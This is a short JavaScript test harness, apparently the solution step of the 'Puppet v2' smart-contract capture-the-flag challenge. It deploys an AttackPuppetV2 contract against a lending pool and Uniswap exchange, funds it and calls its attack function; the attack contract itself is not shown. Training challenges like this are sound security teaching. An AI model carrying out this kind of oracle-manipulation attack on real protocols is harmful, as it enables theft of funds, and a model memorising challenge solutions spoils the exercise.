...
describe("[Challenge] Puppet v2", function () {
  ...
  it("Execution", async function () {
    ...
    let attackPuppet = await (
      await ethers.getContractFactory("AttackPuppetV2", player)
    ).deploy(
      lendingPool.address,
      uniswapExchange.address,
      token.address,
    ...
    await weth
      .connect(player)
      .transfer(attackPuppet.address, ethers.utils.parseEther("19.9"));
    await token
      .connect(player)
      .transfer(attackPuppet.address, PLAYER_INITIAL_TOKEN_BALANCE);
    await attackPuppet.connect(player).attack(PLAYER_INITIAL_TOKEN_BALANCE);
  });
